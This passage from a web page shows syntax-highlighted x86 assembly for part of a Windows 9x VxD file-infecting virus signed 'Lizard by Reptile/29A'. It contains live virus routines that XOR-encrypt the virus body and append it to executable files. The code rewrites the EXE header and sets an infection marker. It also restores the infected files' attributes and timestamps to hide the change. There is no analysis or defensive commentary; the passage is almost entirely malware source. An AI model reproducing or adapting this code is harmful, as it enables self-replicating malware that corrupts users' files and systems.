</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">xl</span><span class="sc0">

</span><span class="sc1">;write virus</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span><span class="sc5">vxdint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">;undo</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">encval</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">encstart</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">esize</span><span class="sc0">

</span><span class="sc5">xll</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">xll</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">    </span><span class="sc1">;eof</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">cwd</span><span class="sc0">
</span><span class="sc5">vxdint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">  </span><span class="sc1">;calc pages</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">np</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">np</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">header</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">header</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">    </span><span class="sc1">;bof</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">cwd</span><span class="sc0">
</span><span class="sc5">vxdint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">rnd</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">   </span><span class="sc1">;set infection flag</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">header</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">   </span><span class="sc1">;write new header</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">26</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">header</span><span class="sc0">
</span><span class="sc5">vxdint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">cfile</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ndta</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;restore attribute</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ndta</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1eh</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
</span><span class="sc5">vxdint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ndta</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">22</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;restore time/date</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ndta</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701</span><span class="sc0">
</span><span class="sc5">vxdint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">  </span><span class="sc1">;close file</span><span class="sc0">
</span><span class="sc5">vxdint</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">fnext</span><span class="sc0">

</span><span class="sc5">ecsit</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">End_Nest_Exec</span><span class="sc0">    
</span><span class="sc5">Pop_Client_State</span><span class="sc0">         

</span><span class="sc5">prevhook</span><span class="sc4">:</span><span class="sc0">      
</span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">LZD_Control</span><span class="sc0">
</span><span class="sc5">Control_Dispatch</span><span class="sc0"> </span><span class="sc5">Init_Complete</span><span class="sc4">,</span><span class="sc5">LZD_Device_Init</span><span class="sc0">
</span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">LZD_Control</span><span class="sc0">
</span><span class="sc5">wb</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'Lizard by Reptile/29A'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">VxD_Locked_Code_Ends</span><span class="sc0">
</span><span class="sc9">End</span><span class="sc0"> </span><span class="sc1">;this is the end my only friend the end...</span></div></body>
</html>
